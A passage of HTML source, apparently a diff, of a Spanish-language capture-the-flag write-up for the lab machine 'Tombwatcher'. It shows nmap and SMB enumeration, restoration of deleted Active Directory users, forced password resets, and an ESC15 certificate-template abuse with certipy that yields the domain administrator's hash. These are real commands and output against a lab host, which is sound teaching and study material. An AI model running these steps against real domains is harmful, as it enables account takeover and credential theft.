C:\\Users\\john\\Documents\u003e Get-ADObject -IncludeDeletedObjects -Filter {Isdeleted -eq $true} Deleted : True DistinguishedName : CN=Deleted Objects,DC=tombwatcher,DC=htb Name : Deleted Objects ObjectClass : container ObjectGUID : 34509cb3-2b23-417b-8b98-13f0bd953319 Deleted : True DistinguishedName : CN=cert_admin\\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb Name : cert_admin DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3 ObjectClass : user ObjectGUID : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3 Deleted : True DistinguishedName : CN=cert_admin\\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb Name : cert_admin DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358 ObjectClass : user ObjectGUID : c1f1f0fe-df9c-494c-bf05-0679e181b358 Deleted : True DistinguishedName : CN=cert_admin\\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb Name : cert_admin DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf ObjectClass : user ObjectGUID : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf Con el siguiente comando vemos los mismos objetos eliminados arriba pero con todas sus propiedades lo cual puede ser de bastante utilidad:\n​\n*Evil-WinRM* PS C:\\Users\\john\\Documents\u003e Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq \"user\"' -IncludeDeletedObjects -Properties * Primero restauramos el usuario identificado como eliminado con Restore-ADObject.\n*Evil-WinRM* PS C:\\Users\\john\\Documents\u003e Restore-ADObject -Identity \"f80369c8-96a2-4a7f-a56c-9c15edd7d1e3\" -NewName \"cert_admin1\" Si ahora miramos los usuarios por ejemplo con el usuario henry ahora veremos que hay un usuario de más que al principio no habíamos visto:\n❯ nxc smb 10.10.11.72 -u 'henry' -p 'H3nry_987TGV!' --users SMB 10.10.11.72 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) SMB 10.10.11.72 445 DC01 [+] tombwatcher.htb\\henry:H3nry_987TGV! SMB 10.10.11.72 445 DC01 -Username- -Last PW Set- -BadPW- -Description- SMB 10.10.11.72 445 DC01 Administrator 2025-06-13 15:49:54 0 Built-in account for administering the computer/domain SMB 10.10.11.72 445 DC01 Guest 0 Built-in account for guest access to the computer/domain SMB 10.10.11.72 445 DC01 krbtgt 2024-11-16 00:02:28 0 Key Distribution Center Service Account SMB 10.10.11.72 445 DC01 Henry 2025-05-12 15:17:03 0 SMB 10.10.11.72 445 DC01 Alfred 2025-05-12 15:17:03 0 SMB 10.10.11.72 445 DC01 sam 2025-06-15 15:15:35 0 SMB 10.10.11.72 445 DC01 john 2025-06-15 15:16:40 0 SMB 10.10.11.72 445 DC01 cert_admin 2024-11-16 17:04:05 0 SMB 10.10.11.72 445 DC01 [*] Enumerated 8 local users: TOMBWATCHER Y realizamos un ForceChangePassword con Net rpc para luego lanzar un escaneo con bloodhound.\n❯ net rpc password \"cert_admin\" 'Micontrafavorita123!' -U TOMBWATCHER.HTB/JOHN%'Micontrafavorita123!' -S \"10.10.11.72\" ❯ nxc smb 10.10.11.72 -u 'cert_admin' -p 'Micontrafavorita123!' SMB 10.10.11.72 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) SMB 10.10.11.72 445 DC01 [+] tombwatcher.htb\\cert_admin:Micontrafavorita123! Le hacemos el certipy pero no detectamos ninguna vulnerabilidad, pero cuando cuando restablecemos los otros usuarios vemos que con el ultimo nos detecta la vulnerabilidad ESC15.\n*Evil-WinRM* PS C:\\Users\\john\\Documents\u003e Restore-ADObject -Identity \"c1f1f0fe-df9c-494c-bf05-0679e181b358\" -NewName \"cert_admin2\" *Evil-WinRM* PS C:\\Users\\john\\Documents\u003e Restore-ADObject -Identity \"938182c3-bf0b-410a-9aaa-45c8e1a02ebf\" -NewName \"cert_admin3\" Una vez restaurado todos los usuarios vemos que tenemos una vulnerabilidad:\n❯ certipy find -u cert_admin@tombwatcher.htb -p Micontrafavorita123! -dc-ip 10.10.11.72 -vulnerable -stdout Certipy v5.0.3 - by Oliver Lyak (ly4k) [*] Finding certificate templates [*] Found 33 certificate templates [*] Finding certificate authorities [*] Found 1 certificate authority [*] Found 11 enabled certificate templates [*] Finding issuance policies [*] Found 13 issuance policies [*] Found 0 OIDs linked to templates [*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP [*] Successfully retrieved CA configuration for 'tombwatcher-CA-1' [*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb' [!] Error checking web enrollment: timed out [!] Use -debug to print a stacktrace [*] Enumeration output: Certificate Authorities 0 CA Name : tombwatcher-CA-1 DNS Name : DC01.tombwatcher.htb Certificate Subject : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb Certificate Serial Number : 3428A7FC52C310B2460F8440AA8327AC Certificate Validity Start : 2024-11-16 00:47:48+00:00 Certificate Validity End : 2123-11-16 00:57:48+00:00 Web Enrollment HTTP Enabled : False HTTPS Enabled : False User Specified SAN : Disabled Request Disposition : Issue Enforce Encryption for Requests : Enabled Active Policy : CertificateAuthority_MicrosoftDefault.Policy Permissions Owner : TOMBWATCHER.HTB\\Administrators Access Rights ManageCa : TOMBWATCHER.HTB\\Administrators TOMBWATCHER.HTB\\Domain Admins TOMBWATCHER.HTB\\Enterprise Admins ManageCertificates : TOMBWATCHER.HTB\\Administrators TOMBWATCHER.HTB\\Domain Admins TOMBWATCHER.HTB\\Enterprise Admins Enroll : TOMBWATCHER.HTB\\Authenticated Users Certificate Templates 0 Template Name : WebServer Display Name : Web Server Certificate Authorities : tombwatcher-CA-1 Enabled : True Client Authentication : False Enrollment Agent : False Any Purpose : False Enrollee Supplies Subject : True Certificate Name Flag : EnrolleeSuppliesSubject Extended Key Usage : Server Authentication Requires Manager Approval : False Requires Key Archival : False Authorized Signatures Required : 0 Schema Version : 1 Validity Period : 2 years Renewal Period : 6 weeks Minimum RSA Key Length : 2048 Template Created : 2024-11-16T00:57:49+00:00 Template Last Modified : 2024-11-16T17:07:26+00:00 Permissions Enrollment Permissions Enrollment Rights : TOMBWATCHER.HTB\\Domain Admins TOMBWATCHER.HTB\\Enterprise Admins TOMBWATCHER.HTB\\cert_admin3 Object Control Permissions Owner : TOMBWATCHER.HTB\\Enterprise Admins Full Control Principals : TOMBWATCHER.HTB\\Domain Admins TOMBWATCHER.HTB\\Enterprise Admins Write Owner Principals : TOMBWATCHER.HTB\\Domain Admins TOMBWATCHER.HTB\\Enterprise Admins Write Dacl Principals : TOMBWATCHER.HTB\\Domain Admins TOMBWATCHER.HTB\\Enterprise Admins Write Property Enroll : TOMBWATCHER.HTB\\Domain Admins TOMBWATCHER.HTB\\Enterprise Admins TOMBWATCHER.HTB\\cert_admin3 [+] User Enrollable Principals : TOMBWATCHER.HTB\\cert_admin3 [!] Vulnerabilities ESC15 : Enrollee supplies subject and schema version is 1. [*] Remarks ESC15 : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details. Explotación ESC15 - Certipy https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu\n❯ certipy req \\ -u 'cert_admin@TOMBWATCHER.HTB' -p 'Micontrafavorita123!' \\ -dc-ip '10.10.11.72' -target 'TOMBWATCHER.HTB' \\ -ca 'tombwatcher-CA-1' -template 'WebServer' \\ -application-policies 'Certificate Request Agent' Certipy v5.0.3 - by Oliver Lyak (ly4k) [*] Requesting certificate via RPC [*] Request ID is 10 [*] Successfully requested certificate [*] Got certificate without identity [*] Certificate has no object SID [*] Try using -sid to set the object SID or see the wiki for more details [*] Saving certificate and private key to 'cert_admin.pfx' File 'cert_admin.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y [*] Wrote certificate and private key to 'cert_admin.pfx' ❯ certipy req \\ -u 'cert_admin@TOMBWATCHER.HTB' -p 'Micontrafavorita123!' \\ -dc-ip '10.10.11.72' -target 'TOMBWATCHER.HTB' \\ -ca 'tombwatcher-CA-1' -template 'User' \\ -pfx 'cert_admin.pfx' -on-behalf-of 'TOMBWATCHER\\Administrator' Certipy v5.0.3 - by Oliver Lyak (ly4k) [*] Requesting certificate via RPC [*] Request ID is 12 [*] Successfully requested certificate [*] Got certificate with UPN 'Administrator@tombwatcher.htb' [*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500' [*] Saving certificate and private key to 'administrator.pfx' [*] Wrote certificate and private key to 'administrator.pfx' ❯ certipy auth -pfx 'administrator.pfx' -dc-ip '10.10.11.72' Certipy v5.0.3 - by Oliver Lyak (ly4k) [*] Certificate identities: [*] SAN UPN: 'Administrator@tombwatcher.htb' [*] Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500' [*] Using principal: 'administrator@tombwatcher.htb' [*] Trying to get TGT... [*] Got TGT [*] Saving credential cache to 'administrator.ccache' [*] Wrote credential cache to 'administrator.ccache' [*] Trying to retrieve NT hash for 'administrator' [*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc ",
+  "wordCount" : "3155",
+  "inLanguage": "en",
+  "image":"https://borhuub.github.io/logo_machines/tombwatcher.png","datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Borhub"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://borhuub.github.io/writeups/tombwatcher/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Borhub Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://borhuub.github.io/%3Clink%20/%20abs%20url%3E"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://borhuub.github.io/" accesskey="h" title="Home (Alt + H)">
+                <img src="https://borhuub.github.io/apple-touch-icon.png" alt="" aria-label="logo"
+                    height="35">Home</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://borhuub.github.io/writeups/" title="Writeups">
+                    <span>Writeups</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://borhuub.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://borhuub.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://borhuub.github.io/writeups/">Writeups</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Tombwatcher
+    </h1>
+    <div class="post-description">
+      Writeups sobre la máquina Tombwatcher en Active Directory de dificultad Media. Tras el reconocimiento y la enumeración SMB aprovecharemos cuentas con SPN para  realizar ataques Kerberoast y usaremos BloodHound para ver privilegios de los usuarios, a partir de las ACL encontradas explotaremos permisos como AddSelf, ReadGMSAPassword, ForceChangePassword, WriteOwner y GenericAll sobre usuarios, restauraremos objetos AD y, finalmente, abusaremos de AD-CS (ESC15) con Certipy para escalar privilegios.
+    </div>
+    <div class="post-meta"><span>15 min</span>&nbsp;·&nbsp;<span>3155 words</span>&nbsp;·&nbsp;<span>Borhub</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#reconocimiento" aria-label="Reconocimiento">Reconocimiento</a></li>
+                <li>
+                    <a href="#enumeraci%c3%b3n-smb" aria-label="Enumeración SMB">Enumeración SMB</a></li>
+                <li>
+                    <a href="#kerberoast-attack---targetedkerberoast" aria-label="Kerberoast attack - targetedKerberoast">Kerberoast attack - targetedKerberoast</a><ul>
+                        
+                <li>
+                    <a href="#sincronizar-hora-con-el-dc" aria-label="Sincronizar hora con el DC">Sincronizar hora con el DC</a></li></ul>
+                </li>
+                <li>
+                    <a href="#enumeraci%c3%b3n-con-bloodhound" aria-label="Enumeración con Bloodhound">Enumeración con Bloodhound</a><ul>
+                        
+                <li>
+                    <a href="#abusando-de-permisos-addself---bloodyad" aria-label="Abusando de permisos AddSelf - BloodyAD">Abusando de permisos AddSelf - BloodyAD</a></li>
+                <li>
+                    <a href="#abusando-de-permisos-readgmsapassword---gmsadumper" aria-label="Abusando de permisos ReadGMSAPassword - gMSADumper">Abusando de permisos ReadGMSAPassword - gMSADumper</a></li>
+                <li>
+                    <a href="#abusando-de-permisos-forcechangepassword---net-rpc" aria-label="Abusando de permisos ForceChangePassword - Net rpc">Abusando de permisos ForceChangePassword - Net rpc</a></li>
+                <li>
+                    <a href="#abusando-de-permisos-writeowner---bloodyad" aria-label="Abusando de permisos WriteOwner - BloodyAD">Abusando de permisos WriteOwner - BloodyAD</a></li></ul>
+                </li>
+                <li>
+                    <a href="#escalada-de-privilegios" aria-label="Escalada de privilegios">Escalada de privilegios</a><ul>
+                        
+                <li>
+                    <a href="#abusando-de-permisos-genericall-sobre-organizational-units-acl" aria-label="Abusando de permisos GenericAll sobre Organizational Units ACL">Abusando de permisos GenericAll sobre Organizational Units ACL</a></li>
+                <li>
+                    <a href="#restaurar-objetos-en-ad-con-powershell---restoread-object" aria-label="Restaurar objetos en AD con PowerShell - RestoreAD-Object">Restaurar objetos en AD con PowerShell - RestoreAD-Object</a></li>
+                <li>
+                    <a href="#explotaci%c3%b3n-esc15---certipy" aria-label="Explotación ESC15 - Certipy">Explotación ESC15 - Certipy</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p>As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account: henry / H3nry_987TGV!</p>
+<p><img alt="tombwatcher_machine" loading="lazy" src="/img/tombwatcher/tombwatcher_machine.png"></p>
+<h1 id="reconocimiento">Reconocimiento<a hidden class="anchor" aria-hidden="true" href="#reconocimiento">#</a></h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ sudo nmap -p- --open -sS --min-rate <span class="m">5000</span> -vvv -n -Pn 10.10.11.72 -oG ports
+</span></span><span class="line"><span class="cl">Host discovery disabled <span class="o">(</span>-Pn<span class="o">)</span>. All addresses will be marked <span class="s1">&#39;up&#39;</span> and scan <span class="nb">times</span> may be slower.
+</span></span><span class="line"><span class="cl">Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-06-14 19:10 CEST
+</span></span><span class="line"><span class="cl">Initiating SYN Stealth Scan at 19:10
+</span></span><span class="line"><span class="cl">Scanning 10.10.11.72 <span class="o">[</span><span class="m">65535</span> ports<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Discovered open port 135/tcp on 10.10.11.72
+</span></span><span class="line"><span class="cl">Discovered open port 53/tcp on 10.10.11.72
+</span></span><span class="line"><span class="cl">Discovered open port 445/tcp on 10.10.11.72
+</span></span><span class="line"><span class="cl">Discovered open port 80/tcp on 10.10.11.72
+</span></span><span class="line"><span class="cl">Discovered open port 139/tcp on 10.10.11.72
+</span></span><span class="line"><span class="cl">Discovered open port 3269/tcp on 10.10.11.72
+</span></span><span class="line"><span class="cl">Discovered open port 49666/tcp on 10.10.11.72
+</span></span><span class="line"><span class="cl">Discovered open port 88/tcp on 10.10.11.72
+</span></span><span class="line"><span class="cl">Discovered open port 49691/tcp on 10.10.11.72
+</span></span><span class="line"><span class="cl">Discovered open port 49755/tcp on 10.10.11.72
+</span></span><span class="line"><span class="cl">Discovered open port 49729/tcp on 10.10.11.72
+</span></span><span class="line"><span class="cl">Discovered open port 636/tcp on 10.10.11.72
+</span></span><span class="line"><span class="cl">Discovered open port 389/tcp on 10.10.11.72
+</span></span><span class="line"><span class="cl">Discovered open port 49712/tcp on 10.10.11.72
+</span></span><span class="line"><span class="cl">Discovered open port 464/tcp on 10.10.11.72
+</span></span><span class="line"><span class="cl">Discovered open port 9389/tcp on 10.10.11.72
+</span></span><span class="line"><span class="cl">Discovered open port 5985/tcp on 10.10.11.72
+</span></span><span class="line"><span class="cl">Discovered open port 593/tcp on 10.10.11.72
+</span></span><span class="line"><span class="cl">Discovered open port 49692/tcp on 10.10.11.72
+</span></span><span class="line"><span class="cl">Discovered open port 49694/tcp on 10.10.11.72
+</span></span><span class="line"><span class="cl">Discovered open port 3268/tcp on 10.10.11.72
+</span></span><span class="line"><span class="cl">Completed SYN Stealth Scan at 19:11, 26.38s elapsed <span class="o">(</span><span class="m">65535</span> total ports<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.72
+</span></span><span class="line"><span class="cl">Host is up, received user-set <span class="o">(</span>0.036s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Scanned at 2025-06-14 19:10:49 CEST <span class="k">for</span> 26s
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65514</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span class="line"><span class="cl">PORT STATE SERVICE REASON
+</span></span><span class="line"><span class="cl">53/tcp open domain syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">80/tcp open http syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">88/tcp open kerberos-sec syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">135/tcp open msrpc syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">139/tcp open netbios-ssn syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">389/tcp open ldap syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">445/tcp open microsoft-ds syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">464/tcp open kpasswd5 syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">593/tcp open http-rpc-epmap syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">636/tcp open ldapssl syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">3268/tcp open globalcatLDAP syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">3269/tcp open globalcatLDAPssl syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">5985/tcp open wsman syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">9389/tcp open adws syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49666/tcp open unknown syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49691/tcp open unknown syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49692/tcp open unknown syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49694/tcp open unknown syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49712/tcp open unknown syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49729/tcp open unknown syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49755/tcp open unknown syn-ack ttl 127​
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Read data files from: /usr/bin/../share/nmap
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 26.44 seconds
+</span></span><span class="line"><span class="cl">Raw packets sent: <span class="m">131063</span> <span class="o">(</span>5.767MB<span class="o">)</span> <span class="p">|</span> Rcvd: <span class="m">35</span> <span class="o">(</span>1.540KB<span class="o">)</span>
+</span></span></code></pre></div><p>Copy ports</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ ports.py ports
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">🔍 Puertos encontrados:
+</span></span><span class="line"><span class="cl">➜ <span class="m">53</span>
+</span></span><span class="line"><span class="cl">➜ <span class="m">80</span>
+</span></span><span class="line"><span class="cl">➜ <span class="m">88</span>
+</span></span><span class="line"><span class="cl">➜ <span class="m">135</span>
+</span></span><span class="line"><span class="cl">➜ <span class="m">139</span>
+</span></span><span class="line"><span class="cl">➜ <span class="m">389</span>
+</span></span><span class="line"><span class="cl">➜ <span class="m">445</span>
+</span></span><span class="line"><span class="cl">➜ <span class="m">464</span>
+</span></span><span class="line"><span class="cl">➜ <span class="m">593</span>
+</span></span><span class="line"><span class="cl">➜ <span class="m">636</span>
+</span></span><span class="line"><span class="cl">➜ <span class="m">3268</span>
+</span></span><span class="line"><span class="cl">➜ <span class="m">3269</span>
+</span></span><span class="line"><span class="cl">➜ <span class="m">5985</span>
+</span></span><span class="line"><span class="cl">➜ <span class="m">9389</span>
+</span></span><span class="line"><span class="cl">➜ <span class="m">49666</span>
+</span></span><span class="line"><span class="cl">➜ <span class="m">49691</span>
+</span></span><span class="line"><span class="cl">➜ <span class="m">49692</span>
+</span></span><span class="line"><span class="cl">➜ <span class="m">49694</span>
+</span></span><span class="line"><span class="cl">➜ <span class="m">49712</span>
+</span></span><span class="line"><span class="cl">➜ <span class="m">49729</span>
+</span></span><span class="line"><span class="cl">➜ <span class="m">49755</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">¡Puertos copiados en el portapapeles!
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ sudo nmap -sCV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49691,49692,49694,49712,49729,49755 10.10.11.72 -oN targeted
+</span></span><span class="line"><span class="cl">Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-06-14 19:14 CEST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.72
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.037s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">53/tcp open domain Simple DNS Plus
+</span></span><span class="line"><span class="cl">80/tcp open http Microsoft IIS httpd 10.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ Potentially risky methods: TRACE
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: IIS Windows Server
+</span></span><span class="line"><span class="cl">88/tcp open kerberos-sec Microsoft Windows Kerberos <span class="o">(</span>server time: 2025-06-14 21:14:02Z<span class="o">)</span>
+</span></span><span class="line"><span class="cl">135/tcp open msrpc Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp open netbios-ssn Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp open ldap Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: tombwatcher.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC01.tombwatcher.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.tombwatcher.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2024-11-16T00:47:59
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after: 2025-11-16T00:47:59
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2025-06-14T21:15:32+00:00<span class="p">;</span> +3h59m55s from scanner time.
+</span></span><span class="line"><span class="cl">445/tcp open microsoft-ds?
+</span></span><span class="line"><span class="cl">464/tcp open kpasswd5?
+</span></span><span class="line"><span class="cl">593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: tombwatcher.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC01.tombwatcher.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.tombwatcher.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2024-11-16T00:47:59
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after: 2025-11-16T00:47:59
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2025-06-14T21:15:31+00:00<span class="p">;</span> +3h59m54s from scanner time.
+</span></span><span class="line"><span class="cl">3268/tcp open ldap Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: tombwatcher.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC01.tombwatcher.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.tombwatcher.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2024-11-16T00:47:59
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after: 2025-11-16T00:47:59
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2025-06-14T21:15:32+00:00<span class="p">;</span> +3h59m55s from scanner time.
+</span></span><span class="line"><span class="cl">3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: tombwatcher.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2025-06-14T21:15:31+00:00<span class="p">;</span> +3h59m54s from scanner time.
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC01.tombwatcher.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.tombwatcher.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2024-11-16T00:47:59
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after: 2025-11-16T00:47:59
+</span></span><span class="line"><span class="cl">5985/tcp open http Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl">9389/tcp open mc-nmf .NET Message Framing
+</span></span></code></pre></div><h1 id="enumeración-smb">Enumeración SMB<a hidden class="anchor" aria-hidden="true" href="#enumeración-smb">#</a></h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nxc smb 10.10.11.72 -u <span class="s1">&#39;henry&#39;</span> -p <span class="s1">&#39;H3nry_987TGV!&#39;</span> --shares
+</span></span><span class="line"><span class="cl">SMB 10.10.11.72 <span class="m">445</span> DC01 <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:tombwatcher.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB 10.10.11.72 <span class="m">445</span> DC01 <span class="o">[</span>+<span class="o">]</span> tombwatcher.htb<span class="se">\h</span>enry:H3nry_987TGV!
